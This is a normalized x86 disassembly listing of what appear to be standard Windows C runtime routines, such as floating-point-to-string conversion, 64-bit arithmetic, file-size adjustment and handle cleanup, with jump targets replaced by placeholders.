jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
sub_4380bd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_425eb1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_4258f0
inc eax
push eax
push edi
push esi
call sub_4250d0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_43817c
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_438239
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43817c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_438964
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_42aae1
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
sub_4382d0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4383b0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_4383d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_4393b6
call sub_4393b6
mov [ esi ] eax
jmp r-xdata
call sub_425eb1
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_423d36
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_4393b6
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_438444
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_423619
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4396c5
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_4384ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_434725
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_425eb1
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_434725
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_434725
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434725
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_438684
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_425eb1
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_43674e
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_425eb1
mov [ eax ] 0xd
call sub_425ec4
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_425ec4
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_425eb1
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_42c8b1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_438684
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_438684
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_438740
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_438798
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_4387c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_439a91
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_439ad3
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4388cd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_42894a
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_424869
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_439c79
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_424869
pop ecx
mov [ ebp - 0x4 ] esi
sub_438964
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_42aae1
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_42aae1
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
